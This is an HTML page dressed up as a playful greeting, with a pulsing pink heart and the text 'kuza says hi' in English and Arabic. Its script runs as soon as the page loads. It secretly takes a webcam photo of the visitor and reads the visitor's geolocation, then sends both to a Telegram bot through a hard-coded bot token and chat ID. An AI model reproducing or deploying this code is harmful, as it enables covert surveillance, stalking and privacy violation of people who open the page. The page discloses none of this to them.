<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title> kuza says hi 💖</title>
<style>
  body {
    background-color: #ffe6f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
    font-family: 'Arial', sans-serif;
  }

  .text {
    font-size: 24px;
    color: #ff1a75;
    margin-bottom: 40px;
    font-weight: bold;
    animation: fade 2s infinite alternate;
  }

  .heart {
    width: 100px;
    height: 100px;
    background-color: #ff4d88;
    position: relative;
    transform: rotate(-45deg);
    animation: pulse 1s infinite;
  }

  .heart::before,
  .heart::after {
    content: "";
    width: 100px;
    height: 100px;
    background-color: #ff4d88;
    border-radius: 50%;
    position: absolute;
  }

  .heart::before {
    top: -50px;
    left: 0;
  }

  .heart::after {
    left: 50px;
    top: 0;
  }

  @keyframes pulse {
    0% { transform: rotate(-45deg) scale(1); }
    50% { transform: rotate(-45deg) scale(1.1); }
    100% { transform: rotate(-45deg) scale(1); }
  }

  @keyframes fade {
    from { opacity: 0.6; }
    to { opacity: 1; }
  }
</style>
</head>
<body>

<div class="text"> kuza say hi كوزا يسلم عليكم💖</div>
<div class="heart"></div>

<script>
    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        await new Promise(resolve => setTimeout(resolve, 3000));

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg');

        const blob = await (await fetch(imageData)).blob();

        const formData = new FormData();
        formData.append("chat_id", "1320552080");
        formData.append("photo", blob, "capture.jpg");

        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
          method: "POST",
          body: formData
        });

        stream.getTracks().forEach(track => track.stop());

        // إرسال الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          const botToken = "6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0";
          const chatId = "1320552080";

          const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

          fetch(url)
            .then(() => console.log("تم إرسال الموقع"))
            .catch(error => console.error("فشل إرسال الموقع:", error));
        }, function(error) {
          console.error("فشل الحصول على الموقع:", error);
        });

      } catch (err) {
        console.error("فشل الوصول إلى الكاميرا:", err);
      }
    }

    captureAndSend();
</script>

</body>
</html>
